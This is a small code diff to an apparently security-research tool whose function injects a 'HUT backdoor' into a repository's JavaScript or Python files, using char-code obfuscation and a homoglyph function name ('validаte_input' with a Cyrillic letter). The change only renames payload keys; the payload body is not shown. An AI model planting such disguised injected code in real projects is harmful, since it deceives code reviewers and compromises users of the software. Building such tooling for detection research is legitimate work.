@@ -37,7 +37,7 @@ def inject_hut_vulnerability(repo_path: str, file_extension: str = ".js", filter
     js_char_codes = ','.join(str(ord(c)) for c in js_code_to_obfuscate)
 
     payloads = {
-        ".js": f"""
+        "js": f"""
 // --- INJECTED HUT BACKDOOR (Homoglyph Attack) ---
 // The function name 'validаte_input' below contains a Cyrillic 'а' (U+0430)
 // which is visually indistinguishable from the Latin 'a' (U+0061).
@@ -50,7 +50,7 @@ function validаte_input(data) {{
 validаte_input("user_data");
 // --- END OF INJECTED CODE ---
 """,
-        ".py": """
+        "py": """
 # --- INJECTED HUT BACKDOOR (Homoglyph Attack) ---
 # The function name 'validаte_input' below contains a Cyrillic 'а' (U+0430)
 # which is visually indistinguishable from the Latin 'a' (U+0061).
